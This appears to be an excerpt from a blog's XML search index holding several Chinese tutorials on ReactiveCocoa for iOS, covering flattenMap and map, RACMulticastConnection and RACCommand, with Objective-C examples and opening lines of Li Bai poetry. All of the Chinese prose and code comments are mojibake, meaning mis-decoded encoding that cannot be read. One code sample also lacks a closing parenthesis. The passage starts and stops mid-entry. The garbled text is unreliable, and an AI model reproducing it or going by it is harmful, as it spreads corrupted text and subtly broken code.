blockä½œç”¨:åšè¿”å›žå€¼çš„å¤„ç† // åšå¥½å¤„ç†ï¼Œé€šè¿‡ä¿¡å·è¿”å›žå‡ºåŽ». return [RACReturnSignal return:[NSString stringWithFormat:@"è¾“å‡º:%@",value]]; &#125;;&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆå››ï¼‰ï¼šFlattenmapå’ŒMap]]></title>
    <url>%2Farchives%2F8b316e8d.html</url>
    <content type="text"><![CDATA[å³¨çœ‰å±±æœˆåŠè½®ç§‹ï¼Œå½±å…¥å¹³ç¾Œæ±Ÿæ°´æµã€‚å¤œå‘æ¸…æºªå‘ä¸‰å³¡ï¼Œæ€å›ä¸è§ä¸‹æ¸å·žã€‚ â€”â€”æŽç™½ã€Šå³¨çœ‰å±±æœˆæ­Œã€‹ flattenMapå’ŒMap flattenMapï¼ŒMapç”¨äºŽæŠŠæºä¿¡å·å†…å®¹æ˜ å°„æˆæ–°çš„å†…å®¹ flattenMapç®€å•ä½¿ç”¨ 12345678910111213141516171819202122232425262728// ç›‘å¬æ–‡æœ¬æ¡†çš„å†…å®¹æ”¹å˜ï¼ŒæŠŠç»“æž„é‡æ–°æ˜ å°„æˆä¸€ä¸ªæ–°å€¼.// flattenMapä½œç”¨:æŠŠæºä¿¡å·çš„å†…å®¹æ˜ å°„æˆä¸€ä¸ªæ–°çš„ä¿¡å·ï¼Œä¿¡å·å¯ä»¥æ˜¯ä»»æ„ç±»åž‹ã€‚// flattenMapä½¿ç”¨æ­¥éª¤:// 1.ä¼ å…¥ä¸€ä¸ªblockï¼Œblockç±»åž‹æ˜¯è¿”å›žå€¼RACStreamï¼Œå‚æ•°value// 2.å‚æ•°valueå°±æ˜¯æºä¿¡å·çš„å†…å®¹ï¼Œæ‹¿åˆ°æºä¿¡å·çš„å†…å®¹åšå¤„ç†// 3.åŒ…è£…æˆRACReturnSignalä¿¡å·ï¼Œè¿”å›žå‡ºåŽ»ã€‚// flattenMapåº•å±‚å®žçŽ°:// 0.flattenMapå†…éƒ¨è°ƒç”¨bindæ–¹æ³•å®žçŽ°çš„,flattenMapä¸­blockçš„è¿”å›žå€¼ï¼Œä¼šä½œä¸ºbindä¸­bindBlockçš„è¿”å›žå€¼ã€‚// 1.å½“è®¢é˜…ç»‘å®šä¿¡å·ï¼Œå°±ä¼šç”ŸæˆbindBlockã€‚// 2.å½“æºä¿¡å·å‘é€å†…å®¹ï¼Œå°±ä¼šè°ƒç”¨bindBlock(value, *stop)// 3.è°ƒç”¨bindBlockï¼Œå†…éƒ¨å°±ä¼šè°ƒç”¨flattenMapçš„blockï¼ŒflattenMapçš„blockä½œç”¨ï¼šå°±æ˜¯æŠŠå¤„ç†å¥½çš„æ•°æ®åŒ…è£…æˆä¿¡å·ã€‚// 4.è¿”å›žçš„ä¿¡å·æœ€ç»ˆä¼šä½œä¸ºbindBlockä¸­çš„è¿”å›žä¿¡å·ï¼Œå½“åšbindBlockçš„è¿”å›žä¿¡å·ã€‚// 5.è®¢é˜…bindBlockçš„è¿”å›žä¿¡å·ï¼Œå°±ä¼šæ‹¿åˆ°ç»‘å®šä¿¡å·çš„è®¢é˜…è€…ï¼ŒæŠŠå¤„ç†å®Œæˆçš„ä¿¡å·å†…å®¹å‘é€å‡ºæ¥ã€‚[[_textField.rac_textSignal flattenMap:^RACStream *(id value) &#123; // blockä»€ä¹ˆæ—¶å€™ : æºä¿¡å·å‘å‡ºçš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªblockã€‚ // blockä½œç”¨ : æ”¹å˜æºä¿¡å·çš„å†…å®¹ã€‚ // è¿”å›žå€¼ï¼šç»‘å®šä¿¡å·çš„å†…å®¹. return [RACReturnSignal return:[NSString stringWithFormat:@"è¾“å‡º:%@",value]];&#125;] subscribeNext:^(id x) &#123; // è®¢é˜…ç»‘å®šä¿¡å·ï¼Œæ¯å½“æºä¿¡å·å‘é€å†…å®¹ï¼Œåšå®Œå¤„ç†ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªblockã€‚ NSLog(@"%@",x);&#125;]; Mapç®€å•ä½¿ç”¨: 123456789101112131415161718192021222324// ç›‘å¬æ–‡æœ¬æ¡†çš„å†…å®¹æ”¹å˜ï¼ŒæŠŠç»“æž„é‡æ–°æ˜ å°„æˆä¸€ä¸ªæ–°å€¼.// Mapä½œç”¨:æŠŠæºä¿¡å·çš„å€¼æ˜ å°„æˆä¸€ä¸ªæ–°çš„å€¼// Mapä½¿ç”¨æ­¥éª¤:// 1.ä¼ å…¥ä¸€ä¸ªblock,ç±»åž‹æ˜¯è¿”å›žå¯¹è±¡ï¼Œå‚æ•°æ˜¯value// 2.valueå°±æ˜¯æºä¿¡å·çš„å†…å®¹ï¼Œç›´æŽ¥æ‹¿åˆ°æºä¿¡å·çš„å†…å®¹åšå¤„ç†// 3.æŠŠå¤„ç†å¥½çš„å†…å®¹ï¼Œç›´æŽ¥è¿”å›žå°±å¥½äº†ï¼Œä¸ç”¨åŒ…è£…æˆä¿¡å·ï¼Œè¿”å›žçš„å€¼ï¼Œå°±æ˜¯æ˜ å°„çš„å€¼ã€‚// Mapåº•å±‚å®žçŽ°:// 0.Mapåº•å±‚å…¶å®žæ˜¯è°ƒç”¨flatternMap,Mapä¸­blockä¸­çš„è¿”å›žçš„å€¼ä¼šä½œä¸ºflatternMapä¸­blockä¸­çš„å€¼ã€‚// 1.å½“è®¢é˜…ç»‘å®šä¿¡å·ï¼Œå°±ä¼šç”ŸæˆbindBlockã€‚// 3.å½“æºä¿¡å·å‘é€å†…å®¹ï¼Œå°±ä¼šè°ƒç”¨bindBlock(value, *stop)// 4.è°ƒç”¨bindBlockï¼Œå†…éƒ¨å°±ä¼šè°ƒç”¨flattenMapçš„block// 5.flattenMapçš„blockå†…éƒ¨ä¼šè°ƒç”¨Mapä¸­çš„blockï¼ŒæŠŠMapä¸­çš„blockè¿”å›žçš„å†…å®¹åŒ…è£…æˆè¿”å›žçš„ä¿¡å·ã€‚// 5.è¿”å›žçš„ä¿¡å·æœ€ç»ˆä¼šä½œä¸ºbindBlockä¸­çš„è¿”å›žä¿¡å·ï¼Œå½“åšbindBlockçš„è¿”å›žä¿¡å·ã€‚// 6.è®¢é˜…bindBlockçš„è¿”å›žä¿¡å·ï¼Œå°±ä¼šæ‹¿åˆ°ç»‘å®šä¿¡å·çš„è®¢é˜…è€…ï¼ŒæŠŠå¤„ç†å®Œæˆçš„ä¿¡å·å†…å®¹å‘é€å‡ºæ¥ã€‚ [[_textField.rac_textSignal map:^id(id value) &#123; // å½“æºä¿¡å·å‘å‡ºï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªblockï¼Œä¿®æ”¹æºä¿¡å·çš„å†…å®¹ // è¿”å›žå€¼ï¼šå°±æ˜¯å¤„ç†å®Œæºä¿¡å·çš„å†…å®¹ã€‚ return [NSString stringWithFormat:@"è¾“å‡º:%@",value];&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;]; FlatternMapå’ŒMapçš„åŒºåˆ« FlatternMapä¸­çš„Blockè¿”å›žä¿¡å·ã€‚ Mapä¸­çš„Blockè¿”å›žå¯¹è±¡ã€‚ å¼€å‘ä¸­ï¼Œå¦‚æžœä¿¡å·å‘å‡ºçš„å€¼ä¸æ˜¯ä¿¡å·ï¼Œæ˜ å°„ä¸€èˆ¬ä½¿ç”¨Map å¼€å‘ä¸­ï¼Œå¦‚æžœä¿¡å·å‘å‡ºçš„å€¼æ˜¯ä¿¡å·ï¼Œæ˜ å°„ä¸€èˆ¬ä½¿ç”¨FlatternMap æ€»ç»“ï¼šsignalOfsignalsç”¨FlatternMap 123456789101112131415161718// åˆ›å»ºä¿¡å·ä¸­çš„ä¿¡å·RACSubject *signalOfsignals = [RACSubject subject];RACSubject *signal = [RACSubject subject];[[signalOfsignals flattenMap:^RACStream *(id value) &#123; // å½“signalOfsignalsçš„signalså‘å‡ºä¿¡å·æ‰ä¼šè°ƒç”¨ return value;&#125;] subscribeNext:^(id x) &#123; // åªæœ‰signalOfsignalsçš„signalå‘å‡ºä¿¡å·æ‰ä¼šè°ƒç”¨ï¼Œå› ä¸ºå†…éƒ¨è®¢é˜…äº†bindBlockä¸­è¿”å›žçš„ä¿¡å·ï¼Œä¹Ÿå°±æ˜¯flattenMapè¿”å›žçš„ä¿¡å·ã€‚ // ä¹Ÿå°±æ˜¯flattenMapè¿”å›žçš„ä¿¡å·å‘å‡ºå†…å®¹ï¼Œæ‰ä¼šè°ƒç”¨ã€‚ NSLog(@"%@aaa",x);&#125;];// ä¿¡å·çš„ä¿¡å·å‘é€ä¿¡å·[signalOfsignals sendNext:signal];// ä¿¡å·å‘é€å†…å®¹[signal sendNext:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆä¸‰ï¼‰ï¼šRACMulticastConnection]]></title>
    <url>%2Farchives%2Ffec44934.html</url>
    <content type="text"><![CDATA[æœè¾žç™½å¸å½©äº‘é—´ï¼Œåƒé‡Œæ±Ÿé™µä¸€æ—¥è¿˜ã€‚ä¸¤å²¸çŒ¿å£°å•¼ä¸ä½ï¼Œè½»èˆŸå·²è¿‡ä¸‡é‡å±±ã€‚ â€”â€”æŽç™½ã€Šæ—©å‘ç™½å¸åŸŽã€‹ RACMulticastConnection ç”¨äºŽå½“ä¸€ä¸ªä¿¡å·ï¼Œè¢«å¤šæ¬¡è®¢é˜…æ—¶ï¼Œä¸ºäº†ä¿è¯åˆ›å»ºä¿¡å·æ—¶ï¼Œé¿å…å¤šæ¬¡è°ƒç”¨åˆ›å»ºä¿¡å·ä¸­çš„blockï¼Œé€ æˆå‰¯ä½œç”¨ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»å¤„ç†ã€‚ ä½¿ç”¨æ³¨æ„:RACMulticastConnectioné€šè¿‡RACSignalçš„-publishæˆ–è€…-muticast:æ–¹æ³•åˆ›å»º. RACMulticastConnectionä½¿ç”¨æ­¥éª¤: åˆ›å»ºä¿¡å· + (RACSignal *)createSignal:(RACDisposable * (^)(id&lt;RACSubscriber&gt; subscriber))didSubscribe åˆ›å»ºè¿žæŽ¥ RACMulticastConnection *connect = [signal publish]; è®¢é˜…ä¿¡å·,æ³¨æ„ï¼šè®¢é˜…çš„ä¸åœ¨æ˜¯ä¹‹å‰çš„ä¿¡å·ï¼Œè€Œæ˜¯è¿žæŽ¥çš„ä¿¡å·ï¼šconnect.signal è¿žæŽ¥ [connect connect] RACMulticastConnectionåº•å±‚åŽŸç†: åˆ›å»ºconnectï¼Œconnect.sourceSignal -&gt; RACSignal(åŽŸå§‹ä¿¡å·) connect.signal -&gt; RACSubject è®¢é˜…connect.signalï¼Œä¼šè°ƒç”¨RACSubjectçš„subscribeNextï¼Œåˆ›å»ºè®¢é˜…è€…ï¼Œè€Œä¸”æŠŠè®¢é˜…è€…ä¿å­˜èµ·æ¥ï¼Œä¸ä¼šæ‰§è¡Œblockã€‚ [connect connect]å†…éƒ¨ä¼šè®¢é˜…RACSignal(åŽŸå§‹ä¿¡å·)ï¼Œå¹¶ä¸”è®¢é˜…è€…æ˜¯RACSubject- è®¢é˜…åŽŸå§‹ä¿¡å·ï¼Œå°±ä¼šè°ƒç”¨åŽŸå§‹ä¿¡å·ä¸­çš„didSubscribe - didSubscribeï¼Œæ‹¿åˆ°è®¢é˜…è€…è°ƒç”¨sendNextï¼Œå…¶å®žæ˜¯è°ƒç”¨RACSubjectçš„sendNext RACSubjectçš„sendNext,ä¼šéåŽ†RACSubjectæ‰€æœ‰è®¢é˜…è€…å‘é€ä¿¡å·ã€‚- å› ä¸ºåˆšåˆšç¬¬äºŒæ­¥ï¼Œéƒ½æ˜¯åœ¨è®¢é˜…RACSubjectï¼Œå› æ­¤ä¼šæ‹¿åˆ°ç¬¬äºŒæ­¥æ‰€æœ‰çš„è®¢é˜…è€…ï¼Œè°ƒç”¨ä»–ä»¬çš„nextBlock éœ€æ±‚ï¼šå‡è®¾åœ¨ä¸€ä¸ªä¿¡å·ä¸­å‘é€è¯·æ±‚ï¼Œæ¯æ¬¡è®¢é˜…ä¸€æ¬¡éƒ½ä¼šå‘é€è¯·æ±‚ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´å¤šæ¬¡è¯·æ±‚ã€‚è§£å†³ï¼šä½¿ç”¨RACMulticastConnectionå°±èƒ½è§£å†³. 1234567891011121314151617181920212223242526272829303132333435363738// 1.åˆ›å»ºè¯·æ±‚ä¿¡å·RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber&#123; NSLog(@"å‘é€è¯·æ±‚"); return nil;&#125;];// 2.è®¢é˜…ä¿¡å·[signal subscribeNext:^(id x) &#123; NSLog(@"æŽ¥æ”¶æ•°æ®");&#125;];// 2.è®¢é˜…ä¿¡å·[signal subscribeNext:^(id x) &#123; NSLog(@"æŽ¥æ”¶æ•°æ®");&#125;];// 3.è¿è¡Œç»“æžœï¼Œä¼šæ‰§è¡Œä¸¤éå‘é€è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡è®¢é˜…éƒ½ä¼šå‘é€ä¸€æ¬¡è¯·æ±‚// RACMulticastConnection:è§£å†³é‡å¤è¯·æ±‚é—®é¢˜// 1.åˆ›å»ºä¿¡å·RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"å‘é€è¯·æ±‚"); [subscriber sendNext:@1]; return nil;&#125;];// 2.åˆ›å»ºè¿žæŽ¥RACMulticastConnection *connect = [signal publish];// 3.è®¢é˜…ä¿¡å·ï¼Œ// æ³¨æ„ï¼šè®¢é˜…ä¿¡å·ï¼Œä¹Ÿä¸èƒ½æ¿€æ´»ä¿¡å·ï¼Œåªæ˜¯ä¿å­˜è®¢é˜…è€…åˆ°æ•°ç»„ï¼Œå¿…é¡»é€šè¿‡è¿žæŽ¥,å½“è°ƒç”¨è¿žæŽ¥ï¼Œå°±ä¼šä¸€æ¬¡æ€§è°ƒç”¨æ‰€æœ‰è®¢é˜…è€…çš„sendNext:[connect.signal subscribeNext:^(id x) &#123; NSLog(@"è®¢é˜…è€…ä¸€ä¿¡å·");&#125;];[connect.signal subscribeNext:^(id x) &#123; NSLog(@"è®¢é˜…è€…äºŒä¿¡å·");&#125;];// 4.è¿žæŽ¥,æ¿€æ´»ä¿¡å·[connect connect];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆäºŒï¼‰ï¼šRACCommandç¯‡]]></title>
    <url>%2Farchives%2F63f63348.html</url>
    <content type="text"><![CDATA[æ—¥ç…§é¦™ç‚‰ç”Ÿç´«çƒŸï¼Œé¥çœ‹ç€‘å¸ƒæŒ‚å‰å·ã€‚é£žæµç›´ä¸‹ä¸‰åƒå°ºï¼Œç–‘æ˜¯é“¶æ²³è½ä¹å¤©ã€‚ â€”â€”æŽç™½ã€Šæœ›åºå±±ç€‘å¸ƒã€‹ RACCommand ç®€å•ä½¿ç”¨ RACä¸­ç”¨äºŽå¤„ç†äº‹ä»¶çš„ç±»ï¼Œå¯ä»¥æŠŠäº‹ä»¶å¦‚ä½•å¤„ç†,äº‹ä»¶ä¸­çš„æ•°æ®å¦‚ä½•ä¼ é€’ï¼ŒåŒ…è£…åˆ°è¿™ä¸ªç±»ä¸­ï¼Œä»–å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç›‘æŽ§äº‹ä»¶çš„æ‰§è¡Œè¿‡ç¨‹ã€‚ executionSignalsæ˜¯signal of signalsï¼Œå¦‚æžœç›´æŽ¥subscribeçš„è¯ä¼šå¾—åˆ°ä¸€ä¸ªsignalï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„valueï¼Œæ‰€ä»¥ä¸€èˆ¬ä¼šé…åˆswitchToLatestã€‚ errors : è·Ÿæ­£å¸¸çš„signalä¸ä¸€æ ·ï¼ŒRACCommandçš„é”™è¯¯ä¸æ˜¯é€šè¿‡sendErroræ¥å®žçŽ°çš„ï¼Œè€Œæ˜¯é€šè¿‡errorså±žæ€§ä¼ é€’å‡ºæ¥çš„ã€‚ executing è¡¨ç¤ºè¯¥commandå½“å‰æ˜¯å¦æ­£åœ¨æ‰§è¡Œã€‚ ä¸€ã€RACCommandä½¿ç”¨æ­¥éª¤: åˆ›å»ºå‘½ä»¤ initWithSignalBlock:(RACSignal*(^)(id input))signalBlock åœ¨signalBlockä¸­ï¼Œåˆ›å»ºRACSignalï¼Œå¹¶ä¸”ä½œä¸ºsignalBlockçš„è¿”å›žå€¼ æ‰§è¡Œå‘½ä»¤ - (RACSignal *)execute:(id)input äºŒã€RACCommandä½¿ç”¨æ³¨æ„: signalBlockå¿…é¡»è¦è¿”å›žä¸€ä¸ªä¿¡å·ï¼Œä¸èƒ½ä¼ nil. å¦‚æžœä¸æƒ³è¦ä¼ é€’ä¿¡å·ï¼Œç›´æŽ¥åˆ›å»ºç©ºçš„ä¿¡å·[RACSignal empty]; RACCommandä¸­ä¿¡å·å¦‚æžœæ•°æ®ä¼ é€’å®Œï¼Œå¿…é¡»è°ƒç”¨[subscriber sendCompleted]ï¼Œè¿™æ—¶å‘½ä»¤æ‰ä¼šæ‰§è¡Œå®Œæ¯•ï¼Œå¦åˆ™æ°¸è¿œå¤„äºŽæ‰§è¡Œä¸­ã€‚ ä¸‰ã€RACCommandè®¾è®¡æ€æƒ³ï¼šå†…éƒ¨signalBlockä¸ºä»€ä¹ˆè¦è¿”å›žä¸€ä¸ªä¿¡å·ï¼Œè¿™ä¸ªä¿¡å·æœ‰ä»€ä¹ˆç”¨ã€‚ åœ¨RACå¼€å‘ä¸­ï¼Œé€šå¸¸ä¼šæŠŠç½‘ç»œè¯·æ±‚å°è£…åˆ°RACCommandï¼Œç›´æŽ¥æ‰§è¡ŒæŸä¸ªRACCommandå°±èƒ½å‘é€è¯·æ±‚ã€‚ å½“RACCommandå†…éƒ¨è¯·æ±‚åˆ°æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦æŠŠè¯·æ±‚çš„æ•°æ®ä¼ é€’ç»™å¤–ç•Œï¼Œè¿™æ—¶å€™å°±éœ€è¦é€šè¿‡signalBlockè¿”å›žçš„ä¿¡å·ä¼ é€’äº†ã€‚ å››ã€å¦‚ä½•æ‹¿åˆ°RACCommandä¸­è¿”å›žä¿¡å·å‘å‡ºçš„æ•°æ®ã€‚ RACCommandæœ‰ä¸ªæ‰§è¡Œä¿¡å·æºexecutionSignalsï¼Œè¿™ä¸ªæ˜¯signal of signals(ä¿¡å·çš„ä¿¡å·),æ„æ€æ˜¯ä¿¡å·å‘å‡ºçš„æ•°æ®æ˜¯ä¿¡å·ï¼Œä¸æ˜¯æ™®é€šçš„ç±»åž‹ã€‚ è®¢é˜…executionSignalså°±èƒ½æ‹¿åˆ°RACCommandä¸­è¿”å›žçš„ä¿¡å·ï¼Œç„¶åŽè®¢é˜…signalBlockè¿”å›žçš„ä¿¡å·ï¼Œå°±èƒ½èŽ·å–å‘å‡ºçš„å€¼ã€‚ äº”ã€ç›‘å¬å½“å‰å‘½ä»¤æ˜¯å¦æ­£åœ¨æ‰§è¡Œexecutingå…­ã€ä½¿ç”¨åœºæ™¯,ç›‘å¬æŒ‰é’®ç‚¹å‡»ï¼Œç½‘ç»œè¯·æ±‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 1.åˆ›å»ºå‘½RACCommand *command = [[RACCommand alloc] initWithSignalBlock:^RACSignal *(id input) &#123; NSLog(@"æ‰§è¡Œå‘½ä»¤"); // åˆ›å»ºç©ºä¿¡å·,å¿…é¡»è¿”å›žä¿¡å· // return [RACSignal empty]; // 2.åˆ›å»ºä¿¡å·,ç”¨æ¥ä¼ é€’æ•°æ® return [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; [subscriber sendNext:@"è¯·æ±‚æ•°æ®"]; // æ³¨æ„ï¼šæ•°æ®ä¼ é€’å®Œï¼Œæœ€å¥½è°ƒç”¨sendCompletedï¼Œè¿™æ—¶å‘½ä»¤æ‰æ‰§è¡Œå®Œæ¯•ã€‚ [subscriber sendCompleted]; return nil; &#125;]; &#125;]; // å¼ºå¼•ç”¨å‘½ä»¤ï¼Œä¸è¦è¢«é”€æ¯ï¼Œå¦åˆ™æŽ¥æ”¶ä¸åˆ°æ•°æ® _conmmand = command; // 3.è®¢é˜…RACCommandä¸­çš„ä¿¡å· [command.executionSignals subscribeNext:^(id x) &#123; [x subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; &#125;]; // RACé«˜çº§ç”¨æ³• // switchToLatest:ç”¨äºŽsignal of signalsï¼ŒèŽ·å–signal of signalså‘å‡ºçš„æœ€æ–°ä¿¡å·,ä¹Ÿå°±æ˜¯å¯ä»¥ç›´æŽ¥æ‹¿åˆ°RACCommandä¸­çš„ä¿¡å· [command.executionSignals.switchToLatest subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; // 4.ç›‘å¬å‘½ä»¤æ˜¯å¦æ‰§è¡Œå®Œæ¯•,é»˜è®¤ä¼šæ¥ä¸€æ¬¡ï¼Œå¯ä»¥ç›´æŽ¥è·³è¿‡ï¼Œskipè¡¨ç¤ºè·³è¿‡ç¬¬ä¸€æ¬¡ä¿¡å·ã€‚ [[command.executing skip:1] subscribeNext:^(id x) &#123; if ([x boolValue] == YES) &#123; // æ­£åœ¨æ‰§è¡Œ NSLog(@"æ­£åœ¨æ‰§è¡Œ"); &#125; else &#123; // æ‰§è¡Œå®Œæˆ NSLog(@"æ‰§è¡Œå®Œæˆ"); &#125;&#125;];// 5.æ‰§è¡Œå‘½ä»¤[self.conmmand execute:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ReactiveCocoaï¼ˆä¸€ï¼‰ï¼šä»‹ç»]]></title>
    <url>%2Farchives%2F48d913e0.html</url>
    <content type="text"><![CDATA[å›ä¸è§é»„æ²³ä¹‹æ°´å¤©ä¸Šæ¥ï¼Œå¥”æµåˆ°æµ·ä¸å¤å›žã€‚å›ä¸è§é«˜å ‚æ˜Žé•œæ‚²ç™½å‘ï¼Œæœå¦‚é’ä¸æš®æˆé›ªã€‚äººç”Ÿå¾—æ„é¡»å°½æ¬¢ï¼ŒèŽ«ä½¿é‡‘æ¨½ç©ºå¯¹æœˆã€‚å¤©ç”Ÿæˆ‘æå¿…æœ‰ç”¨ï¼Œåƒé‡‘æ•£å°½è¿˜å¤æ¥ã€‚çƒ¹ç¾Šå®°ç‰›ä¸”ä¸ºä¹ï¼Œä¼šé¡»ä¸€é¥®ä¸‰ç™¾æ¯ã€‚å²‘å¤«å­ï¼Œä¸¹ä¸˜ç”Ÿï¼Œå°†è¿›é…’ï¼Œæ¯èŽ«åœã€‚ä¸Žå›æ­Œä¸€æ›²ï¼Œè¯·å›ä¸ºæˆ‘ä¾§è€³å¬ã€‚é’Ÿé¼“é¦”çŽ‰ä¸è¶³è´µï¼Œä½†æ„¿é•¿é†‰ä¸å¤é†’ã€‚å¤æ¥åœ£è´¤çš†å¯‚å¯žï¼ŒæƒŸæœ‰é¥®è€…ç•™å…¶åã€‚é™ˆçŽ‹æ˜”æ—¶å®´å¹³ä¹ï¼Œæ–—é…’ååƒæ£æ¬¢è°‘ã€‚ä¸»äººä½•ä¸ºè¨€å°‘é’±ï¼Œå¾„é¡»æ²½å–å¯¹å›é…Œã€‚äº”èŠ±é©¬ï¼Œåƒé‡‘è£˜ï¼Œå‘¼å„¿å°†å‡ºæ¢ç¾Žé…’ï¼Œä¸Žå°”åŒé”€ä¸‡å¤æ„ã€‚ â€”â€”æŽç™½ã€Šå°†è¿›é…’Â·å›ä¸è§é»„æ²³ä¹‹æ°´å¤©ä¸Šæ¥ã€‹ ReactiveCocoa æ˜¯å‡½æ•°å“åº”ç¼–ç¨‹(Functional Reactive Programming, FRP)æ¡†æž¶ å®žé™…çš„å¼€å‘ä¸­æ˜¯å’ŒMVVMç»“åˆè¿›è¡Œå¼€å‘ã€äº’ç›¸å¼¥è¡¥ Githubä¸Šæ•´åˆçš„æ¯”è¾ƒå…¨é¢çš„ï¼ˆMVVMã€RACï¼‰å­¦ä¹ èµ„æ–™ Github ä¸Šé¢æ¯”è¾ƒå…¨çš„èµ„æ–™ ç¾Žå›¢çš„å‡ ç¯‡èµ„æ–™ ï¼ˆå¼€å‘ä¸­å¯èƒ½é‡åˆ°çš„å‘ï¼‰ ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·1 ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·2 ç»†è¯´ReactiveCocoaçš„å†·ä¿¡å·ä¸Žçƒ­ä¿¡å·3 RACSignalçš„Subscriptionæ·±å…¥åˆ†æž æ³¨æ„ç‚¹ RACåªå¤„ç†å¯¹è±¡, è€Œä¸å¤„ç†åƒBOOLè¿™æ ·çš„åŽŸå§‹å€¼. ä¸è¿‡, RACé€šå¸¸ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åšè¿™äº›è½¬æ¢. ä½¿ç”¨Cocoapodså¯¼å…¥ReactiveCocoa æŠ¥é”™ ld: library not found for -lPods è§£å†³æ–¹æ³• : Targetâ€™s General settings and go to Linked Frameworks and Libraries and just delete -libPods.a from the list. ä¿¡å·çš„é‡Šæ”¾ ReactiveCocoaç»´æŠ¤äº†ä¸€ä¸ªå…¨å±€çš„ä¿¡å·é›†åˆã€‚ å¦‚æžœä¿¡å·æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè®¢é˜…è€…ï¼Œå®ƒå°±æ˜¯å¯ç”¨çš„ã€‚å¦‚æžœæ‰€æœ‰è®¢é˜…è€…éƒ½è¢«ç§»é™¤äº†ï¼Œä¿¡å·å°±è¢«é‡Šæ”¾äº†ã€‚ ä¿¡å·çš„å–æ¶ˆè®¢é˜… åœ¨ä¸€ä¸ªcompletedäº‹ä»¶æˆ–erroräº‹ä»¶åŽï¼Œä¸€ä¸ªè®¢é˜…è€…ä¼šè‡ªåŠ¨å°†è‡ªå·±ç§»é™¤ã€‚ æ‰‹åŠ¨ç§»é™¤å¯èƒ½é€šè¿‡RACDisposableæ¥å®Œæˆã€‚RACSignalçš„æ‰€æœ‰è®¢é˜…æ–¹æ³•éƒ½è¿”å›žä¸€ä¸ªRACDisposableå®žä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨å®ƒçš„disposeæ–¹æ³•æ¥æ‰‹åŠ¨ç§»é™¤è®¢é˜…è€…ã€‚ å¦‚æžœæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªä¿¡å·ï¼Œä½†ä¸åŽ»è®¢é˜…å®ƒï¼Œåˆ™ä¿¡å·æ°¸è¿œä¸ä¼šæ‰§è¡Œï¼ŒåŒ…æ‹¬ä»»ä½•å¦‚doNext:è¿™æ ·çš„é™„åŠ æ“ä½œã€‚ Signal eventsæ˜¯çº¿æ€§çš„ï¼Œä¸ä¼šå‡ºçŽ°å¹¶å‘çš„æƒ…å†µï¼Œé™¤éžæ˜¾å¼åœ°æŒ‡å®šSchedulerã€‚æ‰€ä»¥subscribeNext:error:completed:é‡Œçš„blockä¸éœ€è¦é”å®šæˆ–è€…synchronizedç­‰æ“ä½œï¼Œå…¶ä»–çš„eventsä¼šä¾æ¬¡æŽ’é˜Ÿï¼Œç›´åˆ°blockå¤„ç†å®Œæˆã€‚ ç”ŸæˆSignalæ—¶ï¼Œæœ€å¥½æŒ‡å®šName, -setNameWithFormat: æ–¹ä¾¿è°ƒè¯• Side Effect ï¼ˆå‰¯ä½œç”¨ï¼‰ Hot signals without side effects æœ€å¥½ä½¿ç”¨propertyï¼Œå¦‚â€œtextChangedâ€ï¼Œä¸å¤ªç†è§£ä»€ä¹ˆæƒ…å†µç”¨åˆ°è¿™ä¸ªï¼Œæƒå½“åšä¸€ä¸ªé™æ€çš„å±žæ€§æ¥çœ‹å°±è¡Œã€‚ Cold signals without side effects ä½¿ç”¨åè¯ç±»åž‹çš„æ–¹æ³•åï¼Œå¦‚â€œ-currentTextâ€ï¼Œâ€œcurrentModelsâ€ï¼ŒåŒæ—¶è¡¨æ˜Žäº†è¿”å›žå€¼æ˜¯ä»€ä¹ˆï¼ˆè¿™ä¸ªå°¤å…¶å¾—æ³¨æ„ï¼ŒRACSignalçš„nextå€¼æ˜¯idç±»åž‹ï¼Œæ‰€ä»¥å…¨å¾—æ˜¯é çº¦å®šæ‰çŸ¥é“å…·ä½“è¿”å›žç±»åž‹ï¼‰ Signals with side effects è¿™ç§å°±æ˜¯åƒloginä¸€æ 